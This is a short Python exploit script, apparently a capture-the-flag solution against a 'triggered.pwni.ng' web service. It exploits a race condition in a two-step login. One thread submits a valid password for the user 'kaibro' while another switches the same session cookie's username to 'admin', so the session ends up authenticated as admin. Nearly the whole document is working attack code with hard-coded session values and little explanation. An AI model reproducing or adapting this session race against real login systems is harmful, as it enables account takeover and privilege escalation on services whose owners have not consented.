'''
1. LOGIN as kaibro
2. POST /login with same `session` cookie and different username
'''

import threading
import time
import requests

host = "http://triggered.pwni.ng:52856"

def init(user, sess):
    r = requests.get(host + "/logout", cookies={"session":sess})
    setuser(user, sess)

def setuser(user, sess):
    r = requests.post(host + "/login", data={"username": user}, cookies={"session":sess})
    #print(r.headers)
    #print(r.text)

def login(pwd, sess):
    r = requests.post(host + "/login/password", data={"password": pwd}, cookies={"session": sess})
    print(r.headers)
    print(r.text)
    if "admin" in r.text:
        print("Fuckkkkkkk!")


sess = "d505bb4f-343e-47e1-a589-aacb3a4f85c3"
user = "kaibro"
target = "admin"
pwd = "kaibro"

#login(pwd, sess)
#setuser(target, sess)


init(user, sess)

time.sleep(1)

def job():
    login(pwd, sess)
    time.sleep(1)

t = threading.Thread(target = job)

t.start()

setuser(target, sess)
time.sleep(1)

t.join()

print("Done.")
